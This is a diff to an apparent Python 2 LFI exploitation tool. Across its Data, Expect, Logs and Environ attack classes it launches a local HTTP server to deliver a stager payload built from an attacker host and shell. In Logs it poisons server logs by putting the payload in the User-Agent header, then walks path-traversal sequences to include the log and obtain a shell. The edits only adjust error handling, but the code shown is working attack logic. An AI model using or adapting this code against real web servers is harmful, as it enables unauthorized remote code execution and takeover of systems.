@@ -130,7 +130,8 @@ class Data:
             print(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Starting Web Server ... ")
             progressbar()
             try:
-                subprocess.Popen(['python http_server.py'], shell=True)
+                p = subprocess.Popen(['python http_server.py'], shell=True, stdout=subprocess.PIPE)
+                p.communicate()
             except OSError as os_error:
                 print(t.red("[{0}] ".format(datetime.datetime.now()) + "Process Error"))(os_error)
 
@@ -267,7 +268,8 @@ class Expect:
             print(t.cyan("[{0}] ".format(datetime.datetime.now())) + "Starting Web Server ... ")
             progressbar()
             try:
-                subprocess.Popen(['python http_server.py'], shell=True)
+                p = subprocess.Popen(['python http_server.py'], shell=True, stdout=subprocess.PIPE)
+                p.communicate()
             except OSError as os_error:
                 print(t.red("[{0}] ".format(datetime.datetime.now()) + "Process Error"))(os_error)
 
@@ -331,7 +333,8 @@ class Logs:
             payload = stager_payload.format(lhost, shell)
             progressbar()
             try:
-                subprocess.Popen(['python http_server.py'], shell=True)
+                p = subprocess.Popen(['python http_server.py'], shell=True, stdout=subprocess.PIPE)
+                p.communicate()
             except OSError as os_error:
                 print(t.red("[{0}] ".format(datetime.datetime.now()) + "Process Error"))(os_error)
 
@@ -347,52 +350,48 @@ class Logs:
                 r = requests.get(lfi, headers=headers, cookies=f_cookies)
                 if r.status_code != 200:
                     print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
-                    sys.exit(1)
                 else:
                     if not self.relative:
                         r = requests.get(lfi)
+                        print(t.white("[{0}] Try Refreshing Your Browser If You Haven't Gotten A Shell "
+                                      .format(datetime.datetime.now())))
                         if r.status_code != 200:
                             print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
-                            sys.exit(1)
                     else:
                         for path_traversal_sequence in path_traversal_sequences:
                             for counter in xrange(10):
                                 lfi = self.target + path_traversal_sequence * counter + self.location
                                 r = requests.get(lfi)
+                                print(t.white("[{0}] Try Refreshing Your Browser If You Haven't Gotten A Shell "
+                                              .format(datetime.datetime.now())))
                                 if r.status_code != 200:
                                     print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
-                                    sys.exit(1)
-                                else:
-                                    sys.exit(0)
             except requests.HTTPError as access_error:
                 print t.red("[{0}] HTTP Error ".format(datetime.datetime.now()))(access_error)
-                sys.exit(1)
         else:
             try:
                 headers = {'User-Agent': payload}
                 r = requests.get(lfi, headers=headers)
                 if r.status_code != 200:
                     print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime)))
-                    sys.exit(1)
                 else:
                     if not self.relative:
                         r = requests.get(lfi)
+                        print(t.white("[{0}] Try Refreshing Your Browser If You Haven't Gotten A Shell "
+                                      .format(datetime.datetime.now())))
                         if r.status_code != 200:
-                            print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
-                            sys.exit(1)
+                            print(t.white("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
                     else:
                         for path_traversal_sequence in path_traversal_sequences:
                             for counter in xrange(10):
                                 lfi = self.target + path_traversal_sequence * counter + self.location
                                 r = requests.get(lfi)
+                                print(t.white("[{0}] Try Refreshing Your Browser If You Haven't Gotten A Shell "
+                                              .format(datetime.datetime.now())))
                                 if r.status_code != 200:
                                     print(t.red("[{0}] Unexpected HTTP Response ".format(datetime.datetime.now())))
-                                    sys.exit(1)
-                                else:
-                                    sys.exit(0)
             except requests.HTTPError as access_error:
                 print t.red("[{0}] HTTP Error ".format(datetime.datetime.now()))(access_error)
-                sys.exit(1)
 
 
 #---------------------------------------------------------------------------------------------------
@@ -426,7 +425,8 @@ class Environ:
             payload = stager_payload.format(lhost, shell)
             progressbar()
             try:
-                subprocess.Popen(['python http_server.py'], shell=True)
+                p = subprocess.Popen(['python http_server.py'], shell=True, stdout=subprocess.PIPE)
+                p.communicate()
             except OSError as os_error:
                 print(t.red("[{0}] ".format(datetime.datetime.now()) + "Process Error"))(os_error)
 
